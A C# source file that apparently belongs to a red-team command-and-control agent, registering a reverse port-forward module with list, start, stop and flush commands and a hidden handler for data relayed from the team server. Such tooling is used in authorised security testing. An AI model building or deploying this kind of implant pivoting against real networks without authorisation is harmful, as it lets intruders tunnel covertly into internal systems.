using System;
using System.Collections.Generic;

using Agent.Models;
using Agent.Commands;
using Agent.Interfaces;
using Agent.Controllers;



namespace Agent
{
    public class AgentModule : IAgentModule
    {
        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "rportfwd",
                Developer = "Daniel Duggan, Adam Chester",
                Commands = new List<AgentModuleInfo.AgentCommand>
                {
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "list",
                        Description = "Returns a list of current reverse port forwards.",
                        HelpText = "list",
                        Callback = HandleShow
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "start",
                        Description = "Starts a new reverse port forward.",
                        HelpText = "start [bind port] [forward host] [forward port]",
                        Callback = HandleStart
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "stop",
                        Description = "Stops an existing reverse port forward.",
                        HelpText = "stop [bind port]",
                        Callback = HandleStop
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "flush",
                        Description = "Flush all reverse port forwards on an Agent.",
                        HelpText = "flush",
                        Callback = HandleFlush
                    },
                    new AgentModuleInfo.AgentCommand
                    {
                        Name = "DataFromTeamServer",
                        Visible = false,
                        Callback = HandleDataFromTeamServer
                    }
                }
            };
        }

        public void Initialise(AgentController agent, ConfigController config)
        {
            var moduleInfo = GetModuleInfo();
            agent.RegisterAgentModule(moduleInfo);

            new PortFwd(agent);

            agent.SendModuleRegistered(moduleInfo);
        }

        private void HandleShow(string data, AgentController agent, ConfigController config)
        {
            var result = PortFwd.ShowReversePortForwwrds();
            agent.SendCommandOutput(result);
        }

        private void HandleStart(string data, AgentController agent, ConfigController config)
        {
            var result = PortFwd.NewReversePortForward(data);
            agent.SendCommandOutput(result);
        }

        private void HandleStop(string data, AgentController agent, ConfigController config)
        {
            var result = PortFwd.StopReversePortForward(data);
            agent.SendCommandOutput(result);
        }

        private void HandleFlush(string data, AgentController agent, ConfigController config)
        {
            var result = PortFwd.FlushReversePortForwards();
            agent.SendCommandOutput(result);
        }

        private void HandleDataFromTeamServer(string data, AgentController agent, ConfigController config)
        {
            PortFwd.QueueDataFromTeamServer(data);
        }
    }
}